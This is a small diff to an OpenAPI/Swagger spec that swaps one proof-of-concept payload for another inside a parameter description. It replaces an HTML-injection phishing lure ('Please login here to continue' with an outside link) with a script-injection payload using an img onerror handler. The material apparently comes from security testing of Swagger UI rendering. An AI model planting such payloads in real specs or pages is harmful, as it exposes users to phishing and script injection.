@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-             Hi, this is PoC for HTML Injection<br><img src='https://raw.githubusercontent.com/phutr4n/swagger_xss/main/cat1.png'><a href='https://platform.synack.com'><br>Please login here to continue</a>
+             Hi, this is PoC for HTML Injection<br><img src=1 onerror=alert(1)><br>Please login here to continue</a>
 
           format: int64
           in: path
